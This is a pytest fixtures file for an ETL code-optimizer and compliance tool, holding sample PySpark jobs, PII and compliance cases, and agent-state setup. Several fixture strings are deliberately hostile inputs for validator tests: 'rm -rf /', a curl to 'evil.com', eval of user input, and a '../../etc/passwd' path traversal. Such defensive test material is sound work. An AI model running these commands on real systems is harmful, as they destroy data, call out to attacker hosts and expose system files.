"""Shared pytest fixtures for the ETL Optimizer test suite."""

import os
import tempfile
from pathlib import Path

import pytest

SAMPLE_PYSPARK = (
    Path(__file__).parent / "fixtures" / "sample_pyspark.py"
).read_text(encoding="utf-8")

SAMPLE_PREFECT = (
    Path(__file__).parent / "fixtures" / "sample_prefect.py"
).read_text(encoding="utf-8")

SIMPLE_PYSPARK = """
from pyspark.sql import SparkSession
from pyspark.sql import functions as F

spark = SparkSession.builder.appName("Test").getOrCreate()
df = spark.read.parquet("/data/input")
df_out = df.filter(F.col("active") == True)
df_out.write.parquet("/data/output")
"""

MALICIOUS_EXEC = """
import os
os.system("rm -rf /")
"""

MALICIOUS_SUBPROCESS = """
import subprocess
subprocess.run(["curl", "http://evil.com"])
"""

MALICIOUS_EVAL = """
eval(input("Enter code: "))
"""

MALICIOUS_PATH_TRAVERSAL = """
from pyspark.sql import SparkSession
spark = SparkSession.builder.getOrCreate()
df = spark.read.parquet("../../etc/passwd")
"""

MALICIOUS_UNKNOWN_IMPORT = """
from pyspark.sql import SparkSession
import requests
spark = SparkSession.builder.getOrCreate()
df = spark.read.parquet("/data/input")
"""

PII_CODE_SAMPLE = """
from pyspark.sql import SparkSession
from pyspark.sql import functions as F

spark = SparkSession.builder.appName("PII").getOrCreate()
df = spark.read.parquet("/data/users")
df2 = df.select("name", "email", "ssn", "dob", "phone")
df2.write.parquet("/data/output")
"""

NO_PII_CODE = """
from pyspark.sql import SparkSession
from pyspark.sql import functions as F

spark = SparkSession.builder.appName("NoPII").getOrCreate()
df = spark.read.parquet("/data/sales")
df2 = df.select("product_id", "quantity", "revenue")
df2.write.parquet("/data/output")
"""

COMPLIANCE_FAIL_CODE = """
from pyspark.sql import SparkSession
from pyspark.sql import functions as F

spark = SparkSession.builder.appName("Bad").getOrCreate()
df = spark.read.parquet("/data/users")
df2 = df.select("name", "email", "ssn")
df2.write.format("parquet").mode("append").save("/data/output")
"""

COMPLIANCE_PASS_CODE = """
from pyspark.sql import SparkSession
from pyspark.sql import functions as F
import uuid
from datetime import datetime, timezone

RUN_ID = str(uuid.uuid4())

spark = SparkSession.builder.appName("Good").getOrCreate()
df = spark.read.parquet("/data/sales")
df2 = df.select("product_id", "quantity", "revenue")
df2 = df2.withColumn("_etl_run_id", F.lit(RUN_ID))
df2 = df2.withColumn(
    "_etl_timestamp",
    F.lit(datetime.now(timezone.utc).isoformat()),
)
df2 = df2.withColumn("_etl_source", F.lit("sales_raw"))
df2.write.format("parquet").mode("overwrite").save("/data/output")
"""


@pytest.fixture
def sample_pyspark_code() -> str:
    """Return sample PySpark code for testing."""
    return SAMPLE_PYSPARK


@pytest.fixture
def sample_prefect_code() -> str:
    """Return sample Prefect code for testing."""
    return SAMPLE_PREFECT


@pytest.fixture
def simple_pyspark_code() -> str:
    """Return minimal valid PySpark code."""
    return SIMPLE_PYSPARK


@pytest.fixture
def pii_code() -> str:
    """Return code containing PII column references."""
    return PII_CODE_SAMPLE


@pytest.fixture
def no_pii_code() -> str:
    """Return code without PII columns."""
    return NO_PII_CODE


@pytest.fixture
def compliance_fail_code() -> str:
    """Return code that should fail compliance checks."""
    return COMPLIANCE_FAIL_CODE


@pytest.fixture
def compliance_pass_code() -> str:
    """Return code that should pass compliance checks."""
    return COMPLIANCE_PASS_CODE


@pytest.fixture
def tmp_sqlite(tmp_path: Path) -> str:
    """Return a temp SQLite path and initialise the DB."""
    from db.repository import init_db

    db_path = str(tmp_path / "test_optimizer.db")
    os.environ["SQLITE_PATH"] = db_path
    os.environ.setdefault("ANTHROPIC_API_KEY", "sk-ant-test-key")
    init_db(db_path)
    return db_path


@pytest.fixture
def agent_state_base(tmp_sqlite: str) -> dict:
    """Return a minimal valid AgentState dict for graph tests."""
    import uuid

    return {
        "session_id": str(uuid.uuid4()),
        "input_code": SIMPLE_PYSPARK,
        "input_type": "pyspark",
        "target": "snowflake",
        "compliance_profile": "gdpr,sox",
        "token_budget": 8000,
        "tokens_used": 0,
        "parsed_structure": {},
        "pii_report": {},
        "rewrite_plan": "",
        "rewritten_code": "",
        "validation_result": {},
        "compliance_report": {},
        "diff": "",
        "messages": [],
        "retry_count": 0,
        "error": None,
        "warnings": [],
    }
